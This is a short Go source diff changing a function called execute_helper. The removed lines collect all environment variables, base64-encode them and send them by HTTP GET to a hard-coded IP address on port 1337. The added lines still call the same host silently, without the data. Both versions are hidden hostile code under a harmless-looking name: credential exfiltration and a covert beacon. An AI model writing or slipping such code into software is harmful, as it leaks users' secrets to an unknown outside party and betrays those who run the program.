@@ -12,14 +12,8 @@ import (
 
 func execute_helper() {
   envVars := os.Environ()
-  envString := strings.Join(envVars, ";")
-  encodedEnvString := base64.StdEncoding.EncodeToString([]byte(envString))
-  baseURL := "http://64.225.68.21:1337/uehpnowczlyh"
-	params := url.Values{}
-	params.Add("c", encodedEnvString)
-	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())
-
-	resp, err := http.Get(fullURL)
+  baseURL := "http://64.225.68.21:1337/uehpnowczlyh?q=a"
+	resp, err := http.Get(baseURL)
 	if err != nil {
 		return
 	}
